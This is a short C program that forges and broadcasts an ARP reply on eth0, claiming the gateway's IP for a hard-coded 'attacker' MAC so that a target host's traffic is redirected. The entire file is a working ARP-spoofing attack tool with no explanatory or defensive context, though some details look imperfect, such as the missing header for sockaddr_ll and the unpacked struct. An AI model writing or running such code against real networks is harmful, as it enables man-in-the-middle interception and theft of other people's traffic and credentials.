#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define ARP_REQUEST 1
#define ARP_REPLY 2

struct arp_packet {
    struct ethhdr eth;   // Ethernet header
    unsigned short htype; // Hardware type
    unsigned short ptype; // Protocol type
    unsigned char hlen;   // Hardware address length
    unsigned char plen;   // Protocol address length
    unsigned short oper;  // Operation (ARP_REQUEST or ARP_REPLY)
    unsigned char sha[6]; // Sender hardware address (MAC)
    unsigned char spa[4]; // Sender protocol address (IP)
    unsigned char tha[6]; // Target hardware address (MAC)
    unsigned char tpa[4]; // Target protocol address (IP)
};

void print_error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int main() {
    int sockfd;
    struct sockaddr_ll socket_address;
    struct arp_packet packet;

    // Open raw socket
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        print_error("Socket creation failed");
    }

    // Fill Ethernet header
    memset(&packet, 0, sizeof(packet));
    memcpy(packet.eth.h_dest, "\xff\xff\xff\xff\xff\xff", 6); // Broadcast
    memcpy(packet.eth.h_source, "\xAA\xBB\xCC\xDD\xEE\xFF", 6); // Attacker MAC
    packet.eth.h_proto = htons(ETH_P_ARP);

    // Fill ARP header
    packet.htype = htons(1);           // Ethernet
    packet.ptype = htons(ETH_P_IP);    // IPv4
    packet.hlen = 6;                   // MAC address length
    packet.plen = 4;                   // IP address length
    packet.oper = htons(ARP_REPLY);    // ARP reply

    memcpy(packet.sha, "\xAA\xBB\xCC\xDD\xEE\xFF", 6); // Attacker MAC
    inet_pton(AF_INET, "192.168.1.1", packet.spa);     // Gateway IP
    memcpy(packet.tha, "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Target MAC
    inet_pton(AF_INET, "192.168.1.2", packet.tpa);     // Target IP

    // Send ARP packet
    socket_address.sll_ifindex = if_nametoindex("eth0");
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);

    if (sendto(sockfd, &packet, sizeof(packet), 0,
               (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
        print_error("Send failed");
    }

    printf("ARP spoofing packet sent.\n");
    close(sockfd);

    return 0;
}
